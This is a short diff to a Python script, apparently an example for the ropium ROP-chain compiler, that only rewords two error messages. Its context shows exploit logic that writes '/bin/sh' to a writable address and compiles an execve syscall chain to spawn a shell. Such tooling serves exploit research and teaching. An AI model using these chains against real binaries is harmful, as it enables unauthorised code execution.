@@ -14,11 +14,11 @@ rop.load(binary)
 
 store_mem_chain = rop.compile('[{}] = "/bin/sh\x00"'.format(rwaddr))
 if store_mem_chain is None:
-    print("Error: to generate store_mem chain")
+    print("ropium could not generate store_mem chain")
     sys.exit(1)
 syscall_chain = rop.compile('sys_execve({}, 0, 0)'.format(rwaddr))
 if syscall_chain is None:
-    print("Error: to generate syscall chain")
+    print("ropium could not generate syscall chain")
     sys.exit(1)
 
 chain = store_mem_chain + syscall_chain
